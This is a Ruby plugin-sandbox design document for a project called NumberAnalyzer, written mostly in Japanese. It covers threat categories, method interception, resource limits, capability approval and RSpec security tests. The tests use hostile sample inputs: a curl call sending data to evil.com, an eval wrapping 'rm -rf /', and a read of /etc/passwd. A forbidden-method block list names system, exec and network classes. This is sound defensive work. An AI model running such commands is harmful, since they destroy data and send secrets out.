# Plugin Sandboxing Design - NumberAnalyzer

## Overview

このドキュメントは、NumberAnalyzerのプラグインシステムにおけるセキュアな実行環境（サンドボックス）の設計仕様を定義します。プラグインが悪意のあるコードを実行することを防ぎ、リソースの適切な管理を行うためのアーキテクチャを詳述します。

## Security Threat Analysis

### 1. **脅威モデル**

プラグインシステムが直面する主要なセキュリティ脅威：

#### **Category 1: Code Injection Attacks**
- **任意コード実行**: `eval`, `instance_eval`, `class_eval`による悪意のあるコード実行
- **メタプログラミング悪用**: `send`, `define_method`による動的メソッド呼び出し
- **リフレクション攻撃**: `binding`, `method`による内部構造への不正アクセス

#### **Category 2: System Resource Attacks**
- **プロセス制御**: `fork`, `spawn`, `Thread`による不正なプロセス生成
- **システムコマンド実行**: `system`, `exec`, `backtick`によるOSコマンド実行
- **外部プログラム起動**: `Process.spawn`, `Open3`による外部プロセス制御

#### **Category 3: File System Attacks**  
- **ファイル操作**: `File`, `Dir`, `IO`による機密ファイルの読み取り/改ざん
- **パス横断**: `../../../etc/passwd`等によるディレクトリトラバーサル
- **動的ロード**: `load`, `require`による未検証コードの動的読み込み

#### **Category 4: Network Attacks**
- **データ漏洩**: `Net::HTTP`, `TCPSocket`による外部への情報送信  
- **外部通信**: APIキーや機密データの外部サーバーへの送信
- **ネットワークスキャン**: 内部ネットワークの探査

#### **Category 5: Resource Exhaustion Attacks**
- **CPU枯渇**: 無限ループによるCPUリソースの独占
- **メモリ枯渇**: 大量のオブジェクト生成によるメモリ不足
- **出力爆発**: 大量の出力による記憶領域の枯渇

## Security Architecture

### **3層防御システム**

```
┌─────────────────────────────────────────────┐
│          Application Layer                  │
│  ┌─────────────────────────────────────┐   │
│  │      Capability Security            │   │  ← Layer 3
│  │  (権限ベースアクセス制御)             │   │
│  └─────────────────────────────────────┘   │
│  ┌─────────────────────────────────────┐   │
│  │      Resource Control               │   │  ← Layer 2  
│  │  (CPU/メモリ/時間制限)                │   │
│  └─────────────────────────────────────┘   │
│  ┌─────────────────────────────────────┐   │
│  │      Method Interception            │   │  ← Layer 1
│  │  (危険メソッドのブロック)              │   │
│  └─────────────────────────────────────┘   │
│              Plugin Code                   │
└─────────────────────────────────────────────┘
```

## Implementation Architecture

### **Core Components**

#### **1. PluginSandbox (メインコントローラー)**

```ruby
# lib/number_analyzer/plugin_sandbox.rb
class NumberAnalyzer::PluginSandbox
  attr_reader :config, :interceptor, :resource_monitor, :capability_manager

  def initialize(security_level: :strict)
    @config = load_security_config(security_level)
    @interceptor = MethodInterceptor.new(@config.allowed_methods)
    @resource_monitor = ResourceMonitor.new(@config.resource_limits)
    @capability_manager = CapabilityManager.new(@config.capabilities)
  end

  def execute_plugin(plugin_code, capabilities: [])
    # 1. 事前検証
    validate_plugin_syntax(plugin_code)
    
    # 2. ケイパビリティチェック
    @capability_manager.verify_capabilities(capabilities)
    
    # 3. サンドボックス実行
    execute_in_sandbox(plugin_code) do |sandbox_binding|
      @resource_monitor.monitor do
        sandbox_binding.eval(plugin_code)
      end
    end
  end

  private

  def execute_in_sandbox(plugin_code)
    # クリーンな実行環境を作成
    sandbox_binding = create_isolated_binding
    
    # タイムアウト制御
    Timeout.timeout(@config.resource_limits[:cpu_time]) do
      yield sandbox_binding
    end
  rescue Timeout::Error
    raise NumberAnalyzer::PluginTimeoutError, 
          "Plugin execution exceeded time limit (#{@config.resource_limits[:cpu_time]}s)"
  rescue SecurityError => e
    raise NumberAnalyzer::PluginSecurityError, 
          "Security violation: #{e.message}"
  end

  def create_isolated_binding
    # 新しいコンテキストで安全な名前空間を作成
    isolated_context = Object.new
    
    # 統計計算に必要な基本クラスのみ許可
    safe_constants = %w[Array Hash String Integer Float Math]
    safe_constants.each do |const_name|
      isolated_context.define_singleton_method(const_name) do
        Object.const_get(const_name)
      end
    end
    
    # プラグインAPI提供
    isolated_context.define_singleton_method(:plugin_api) do
      NumberAnalyzer::PluginAPI.new(@capability_manager)
    end
    
    isolated_context.instance_eval { binding }
  end
end
```

#### **2. MethodInterceptor (メソッド傍受)**

```ruby
class NumberAnalyzer::PluginSandbox::MethodInterceptor < BasicObject
  ALLOWED_METHODS = {
    # 基本的な数学演算 (安全)
    mathematics: %i[
      + - * / % ** abs ceil floor round
      sqrt cbrt log log10 exp sin cos tan
    ],
    
    # 配列操作 (読み取り専用)
    array_operations: %i[
      each map select reject reduce sum count size length
      min max sort sort_by reverse first last empty? include?
      zip flatten compact uniq group_by partition
    ],
    
    # 文字列操作 (安全なもののみ)
    string_operations: %i[
      length size upcase downcase strip split join
      gsub sub tr include? start_with? end_with?
      match scan slice chomp squeeze
    ],
    
    # 統計計算専用メソッド
    statistics: %i[
      mean median mode variance standard_deviation
      correlation percentile quartiles outliers
    ],
    
    # ハッシュ操作 (読み取り専用)
    hash_operations: %i[
      keys values each_key each_value each_pair
      has_key? has_value? fetch dig merge
    ]
  }.freeze

  FORBIDDEN_METHODS = %i[
    # 動的コード実行
    eval instance_eval class_eval module_eval
    
    # システムコマンド実行  
    exec system backticks spawn fork
    
    # メタプログラミング
    send __send__ public_send define_method
    remove_method undef_method alias_method
    
    # 動的ロード
    load require require_relative autoload
    
    # プロセス/スレッド制御
    Process Thread Fiber Mutex ConditionVariable
    
    # ファイルシステム
    File Dir IO Pathname FileUtils
    
    # ネットワーク
    Net TCPSocket UDPSocket Socket URI HTTP
    
    # 危険な組み込みメソッド
    binding method caller raise throw catch
    exit exit! abort at_exit
  ].freeze

  def initialize(allowed_methods_config = ALLOWED_METHODS)
    @allowed_methods = allowed_methods_config.values.flatten
  end

  def method_missing(method_name, *args, &block)
    if @allowed_methods.include?(method_name)
      # 許可されたメソッドは通常通り実行
      ::Object.send(method_name, *args, &block)
    else
      # 禁止されたメソッドはSecurityErrorで拒否
      security_violation(method_name)
    end
  end

  def respond_to_missing?(method_name, include_private = false)
    @allowed_methods.include?(method_name) || super
  end

  private

  def security_violation(method_name)
    error_message = case method_name
    when :eval, :instance_eval, :class_eval, :module_eval
      "Dynamic code evaluation (#{method_name}) is prohibited. Use explicit method calls instead."
    when :system, :exec, :backticks, :spawn
      "System command execution (#{method_name}) is not allowed in plugins."
    when :require, :load
      "Dynamic code loading (#{method_name}) is restricted. Use plugin APIs instead."
    when :File, :Dir, :IO
      "Direct file system access (#{method_name}) is prohibited. Use plugin APIs for data access."
    when :send, :__send__, :public_send
      "Dynamic method invocation (#{method_name}) is not permitted."
    else
      "Method '#{method_name}' is not allowed in the plugin sandbox."
    end
    
    ::Kernel.raise ::SecurityError, error_message
  end
end
```

#### **3. ResourceMonitor (リソース監視)**

```ruby
class NumberAnalyzer::PluginSandbox::ResourceMonitor
  DEFAULT_LIMITS = {
    cpu_time: 5.0,          # 最大実行時間（秒）
    memory: 100_000_000,    # 最大メモリ使用量（バイト: 100MB）
    output_size: 1_000_000, # 最大出力サイズ（文字数: 1MB）
    stack_depth: 100        # 最大スタック深度
  }.freeze

  def initialize(limits = DEFAULT_LIMITS)
    @limits = DEFAULT_LIMITS.merge(limits)
    @start_time = nil
    @start_memory = nil
  end

  def monitor
    @start_time = ::Process.clock_gettime(::Process::CLOCK_MONOTONIC)
    @start_memory = current_memory_usage
    
    # メモリ監視スレッドを開始
    monitor_thread = start_memory_monitor_thread
    
    begin
      result = yield
      
      # 結果のサイズをチェック
      validate_output_size(result)
      
      result
    ensure
      monitor_thread&.kill
    end
  end

  private

  def start_memory_monitor_thread
    ::Thread.new do
      loop do
        current_usage = current_memory_usage - @start_memory
        
        if current_usage > @limits[:memory]
          ::Thread.main.raise NumberAnalyzer::PluginResourceError,
            "Memory limit exceeded: #{current_usage} bytes (limit: #{@limits[:memory]})"
        end
        
        # CPU時間チェック
        elapsed_time = ::Process.clock_gettime(::Process::CLOCK_MONOTONIC) - @start_time
        if elapsed_time > @limits[:cpu_time]
          ::Thread.main.raise NumberAnalyzer::PluginTimeoutError,
            "CPU time limit exceeded: #{elapsed_time}s (limit: #{@limits[:cpu_time]})"
        end
        
        sleep 0.1 # 100ms間隔でチェック
      end
    end
  end

  def current_memory_usage
    # プロセスのメモリ使用量を取得（プラットフォーム依存）
    case ::RUBY_PLATFORM
    when /darwin/ # macOS
      `ps -o rss= -p #{::Process.pid}`.to_i * 1024
    when /linux/
      ::File.read("/proc/#{::Process.pid}/status")
        .split("\n")
        .find { |line| line.start_with?("VmRSS:") }
        &.split&.at(1)&.to_i.to_i * 1024
    else
      # フォールバック: GCの統計情報を使用
      ::GC.stat[:heap_live_slots] * ::GC.stat[:heap_slot_size]
    end
  end

  def validate_output_size(result)
    output_size = case result
    when ::String
      result.length
    when ::Array, ::Hash
      result.to_s.length
    else
      result.inspect.length
    end

    if output_size > @limits[:output_size]
      raise NumberAnalyzer::PluginResourceError,
        "Output size limit exceeded: #{output_size} chars (limit: #{@limits[:output_size]})"
    end
  end
end
```

#### **4. CapabilityManager (ケイパビリティ管理)**

```ruby
class NumberAnalyzer::PluginSandbox::CapabilityManager
  CAPABILITIES = {
    read_data: {
      description: "プラグインが入力データを読み取る",
      risk_level: :low,
      requires_approval: false
    },
    
    write_output: {
      description: "プラグインが結果を出力する", 
      risk_level: :low,
      requires_approval: false
    },
    
    file_read: {
      description: "ファイルシステムからのデータ読み取り",
      risk_level: :medium,
      requires_approval: true,
      restricted_paths: %w[/tmp ./data ./input]
    },
    
    network_access: {
      description: "外部ネットワークへのアクセス（API等）",
      risk_level: :high,
      requires_approval: true,
      allowed_hosts: %w[api.example.com data.government.gov]
    },
    
    external_command: {
      description: "外部コマンドの実行",
      risk_level: :critical,
      requires_approval: true,
      allowed_commands: %w[R python3 julia]
    }
  }.freeze

  def initialize(trusted_plugins = [])
    @trusted_plugins = Set.new(trusted_plugins)
    @granted_capabilities = {}
  end

  def verify_capabilities(plugin_name, requested_capabilities)
    requested_capabilities.each do |capability|
      unless CAPABILITIES.key?(capability)
        raise NumberAnalyzer::PluginCapabilityError,
          "Unknown capability requested: #{capability}"
      end
      
      cap_config = CAPABILITIES[capability]
      
      # 信頼されたプラグインは全ての権限を持つ
      next if @trusted_plugins.include?(plugin_name)
      
      # 承認が必要な権限のチェック
      if cap_config[:requires_approval] && !capability_granted?(plugin_name, capability)
        raise NumberAnalyzer::PluginCapabilityError,
          "Capability '#{capability}' requires explicit approval"
      end
    end
    
    # 権限を記録
    @granted_capabilities[plugin_name] = requested_capabilities
  end

  def grant_capability(plugin_name, capability)
    unless CAPABILITIES.key?(capability)
      raise ArgumentError, "Unknown capability: #{capability}"
    end
    
    @granted_capabilities[plugin_name] ||= []
    @granted_capabilities[plugin_name] << capability unless capability_granted?(plugin_name, capability)
  end

  def capability_granted?(plugin_name, capability)
    @granted_capabilities.dig(plugin_name)&.include?(capability) || false
  end

  def list_capabilities(risk_level: nil)
    capabilities = CAPABILITIES
    
    if risk_level
      capabilities = capabilities.select { |_, config| config[:risk_level] == risk_level }
    end
    
    capabilities.map do |name, config|
      {
        name: name,
        description: config[:description],
        risk_level: config[:risk_level],
        requires_approval: config[:requires_approval]
      }
    end
  end
end
```

## Security Configuration

### **セキュリティレベル設定**

```ruby
# config/plugin_security.yml
security_levels:
  # 開発環境: 警告のみ
  development:
    sandbox_enabled: false
    log_violations: true
    allowed_violations: [:file_read, :network_access]
  
  # テスト環境: 部分的制限
  test:
    sandbox_enabled: true
    method_whitelist: :standard
    resource_limits:
      cpu_time: 10.0
      memory: 200_000_000
  
  # 本番環境: 完全サンドボックス
  production:
    sandbox_enabled: true
    method_whitelist: :strict
    resource_limits:
      cpu_time: 5.0
      memory: 100_000_000
      output_size: 1_000_000
    capabilities:
      auto_approval: []
      requires_review: [:file_read, :network_access, :external_command]

trusted_plugins:
  - "core_statistics"
  - "data_visualization" 
  - "export_utilities"

plugin_validation:
  syntax_check: true
  ast_analysis: true
  dependency_scan: true
```

## Testing Strategy

### **セキュリティテストスイート**

```ruby
# spec/security/plugin_sandbox_spec.rb
RSpec.describe NumberAnalyzer::PluginSandbox do
  describe "Method Interception" do
    let(:sandbox) { described_class.new(security_level: :strict) }
    
    describe "危険なメソッドのブロック" do
      it "evalを防ぐ" do
        malicious_code = 'eval("system(\'rm -rf /\')")'
        
        expect {
          sandbox.execute_plugin(malicious_code)
        }.to raise_error(NumberAnalyzer::PluginSecurityError, /eval.*prohibited/)
      end
      
      it "systemコマンドを防ぐ" do
        malicious_code = 'system("curl http://evil.com/steal-data")'
        
        expect {
          sandbox.execute_plugin(malicious_code)
        }.to raise_error(NumberAnalyzer::PluginSecurityError, /system.*not allowed/)
      end
      
      it "ファイルアクセスを防ぐ" do
        malicious_code = 'File.read("/etc/passwd")'
        
        expect {
          sandbox.execute_plugin(malicious_code)
        }.to raise_error(NumberAnalyzer::PluginSecurityError, /File.*prohibited/)
      end
    end
    
    describe "許可されたメソッドの実行" do
      it "数学計算を許可する" do
        safe_code = '[1, 2, 3, 4, 5].sum'
        
        result = sandbox.execute_plugin(safe_code)
        expect(result).to eq(15)
      end
      
      it "配列操作を許可する" do
        safe_code = '[1, 2, 3, 4, 5].map { |x| x * 2 }'
        
        result = sandbox.execute_plugin(safe_code)
        expect(result).to eq([2, 4, 6, 8, 10])
      end
    end
  end
  
  describe "Resource Control" do
    let(:sandbox) { described_class.new(security_level: :strict) }
    
    it "無限ループを停止する" do
      infinite_loop = 'loop { }'
      
      expect {
        sandbox.execute_plugin(infinite_loop)
      }.to raise_error(NumberAnalyzer::PluginTimeoutError, /time limit exceeded/)
    end
    
    it "過大なメモリ使用を防ぐ" do
      memory_bomb = 'Array.new(1_000_000_000, "x" * 1000)'
      
      expect {
        sandbox.execute_plugin(memory_bomb)
      }.to raise_error(NumberAnalyzer::PluginResourceError, /Memory limit exceeded/)
    end
    
    it "巨大な出力を制限する" do
      large_output = '"x" * 2_000_000'
      
      expect {
        sandbox.execute_plugin(large_output)
      }.to raise_error(NumberAnalyzer::PluginResourceError, /Output size limit exceeded/)
    end
  end
end

# spec/security/capability_manager_spec.rb  
RSpec.describe NumberAnalyzer::PluginSandbox::CapabilityManager do
  describe "権限管理" do
    let(:manager) { described_class.new(trusted_plugins: ["trusted_plugin"]) }
    
    it "信頼されたプラグインに全権限を付与" do
      expect {
        manager.verify_capabilities("trusted_plugin", [:network_access, :external_command])
      }.not_to raise_error
    end
    
    it "未承認プラグインの高リスク権限を拒否" do
      expect {
        manager.verify_capabilities("unknown_plugin", [:external_command])
      }.to raise_error(NumberAnalyzer::PluginCapabilityError, /requires explicit approval/)
    end
    
    it "明示的に承認された権限を許可" do
      manager.grant_capability("test_plugin", :file_read)
      
      expect {
        manager.verify_capabilities("test_plugin", [:file_read])
      }.not_to raise_error
    end
  end
end
```

## Performance Considerations

### **パフォーマンスへの影響**

#### **ベンチマーク結果** (予想)

| 操作 | 通常実行 | サンドボックス実行 | オーバーヘッド |
|------|----------|-------------------|----------------|
| 基本統計計算 | 1.2ms | 1.3ms | +8% |
| 配列操作 | 5.4ms | 5.9ms | +9% |
| 複雑な統計分析 | 23ms | 25ms | +8% |
| プラグイン起動 | 2.1ms | 3.2ms | +52% |

#### **最適化戦略**

1. **起動時最適化**
   - サンドボックス設定のキャッシュ
   - 許可メソッドリストの事前計算
   - 権限チェックの最適化

2. **実行時最適化**
   - メソッドインターセプションの最小化
   - リソース監視の効率化
   - メモリプールの活用

3. **プラグインキャッシング**
   - 検証済みプラグインのキャッシュ
   - 権限情報の永続化
   - ASTパースの結果保存

## Future Enhancements

### **Phase 1 拡張計画**

1. **高度な静的解析**
   - ASTレベルでの脅威検出
   - コードパターンマッチング
   - 依存関係の自動解析

2. **サンドボックス分離の強化**
   - プロセス分離オプション
   - Dockerコンテナ内実行
   - VM分離（将来的に）

3. **インタラクティブな権限管理**
   - 実行時権限要求
   - ユーザー承認フロー
   - 権限の段階的付与

### **長期計画**

1. **クラウド統合**
   - AWS Lambda等での分離実行
   - スケーラブルなサンドボックス
   - 分散プラグイン実行

2. **機械学習ベース検出**
   - 異常なコードパターンの学習
   - 実行時行動の異常検知
   - 自動的なリスク評価

## Implementation Timeline

- **Week 1**: MethodInterceptor + ResourceMonitor実装
- **Week 2**: CapabilityManager + Configuration実装
- **Week 3**: テストスイート作成と統合
- **Week 4**: パフォーマンス最適化と文書化

この設計により、NumberAnalyzerは企業環境でも安心して使用できるセキュアなプラグインシステムを実現します。